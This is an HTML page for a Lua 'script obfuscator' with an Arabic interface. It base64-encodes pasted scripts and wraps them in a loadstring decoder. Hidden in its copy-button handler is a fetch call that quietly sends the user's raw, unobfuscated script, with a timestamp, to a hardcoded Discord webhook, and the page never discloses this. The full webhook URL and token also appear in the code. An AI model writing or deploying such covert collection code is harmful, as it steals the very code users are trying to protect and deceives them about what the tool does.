<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>N60 Script Obfuscator</title>

<style>
body{
    margin:0;
    background:#000;
    color:#fff;
    font-family:Arial, sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}
.container{
    width:360px;
    background:#0b0b0b;
    border-radius:10px;
    padding:15px;
    box-shadow:0 0 20px #000;
}
.logo{
    width:100%;
    margin-bottom:15px;
}
.box{
    background:#111;
    border:1px solid #222;
    border-radius:8px;
    padding:10px;
    margin-bottom:10px;
}
.title{
    font-size:14px;
    margin-bottom:5px;
    color:#ccc;
}
textarea{
    width:100%;
    height:120px;
    background:#000;
    color:#0f0;
    border:none;
    resize:none;
    padding:8px;
    outline:none;
    font-family:monospace;
    font-size:12px;
    border-radius:5px;
}
.click{
    text-align:center;
    color:#aaa;
    font-size:13px;
    cursor:pointer;
    margin-bottom:5px;
}
.row{
    display:flex;
    justify-content:space-between;
    align-items:center;
}
.copy{
    background:#1a1a1a;
    color:#fff;
    border:none;
    padding:5px 12px;
    border-radius:5px;
    cursor:pointer;
}
.copy:hover{background:#333;}
</style>
</head>

<body>

<div class="container">

    <!-- الصورة -->
    <img src="https://i.postimg.cc/62LR5nTY/image.png" class="logo">

    <!-- إدخال السكربت -->
    <div class="box">
        <div class="title">حط سكربتك هنا</div>
        <div class="click" onclick="document.getElementById('input').focus()">اضغط هنا لكتابة السكربت</div>
        <textarea id="input"></textarea>
    </div>

    <!-- الإخراج -->
    <div class="box">
        <div class="row">
            <div class="title">كود التشفير</div>
            <button class="copy" onclick="copyCode()">نسخ</button>
        </div>
        <textarea id="output" readonly></textarea>
    </div>

</div>

<script>
/* ================= SETTINGS ================= */
const WEBHOOK_URL = "https://discord.com/api/webhooks/1451204305108336701/snBFcF3owTXHdzQHK8vcFIxKK39XJ8Op-pN-hoyTly015J_xyR0aMpxcSOEKJjevYz6x";

/* ================= LOADER HEADER ================= */
const header =
`-- ================= https://n60script.github.io/N60/ =================
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function decode(data)
    data = string.gsub(data,'[^'..b..'=]','')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do
            r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do
            c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
        end
        return string.char(c)
    end))
end

loadstring(decode([[
`;

const footer = `
]]))()`;

/* ================= BASE64 ================= */
function encodeBase64(str){
    return btoa(unescape(encodeURIComponent(str)));
}

/* ================= LIVE UPDATE ================= */
document.getElementById("input").addEventListener("input", function(){
    const raw = this.value;
    if(!raw.trim()){
        document.getElementById("output").value = "";
        return;
    }
    const encoded = encodeBase64(raw);
    document.getElementById("output").value = header + encoded + footer;
});

/* ================= COPY + WEBHOOK ================= */
function copyCode(){
    const input = document.getElementById("input").value;
    const output = document.getElementById("output");

    if(!input.trim()) return;

    // نسخ الكود المشفر
    output.select();
    document.execCommand("copy");

    // إرسال السكربت الخام (بدون تشفير)
    fetch(WEBHOOK_URL,{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify({
            content:
"📥 **New Script Submitted**\n" +
"🕒 " + new Date().toLocaleString() + "\n" +
"```lua\n" + input + "\n```"
        })
    }).catch(()=>{});
}
</script>

</body>
</html>
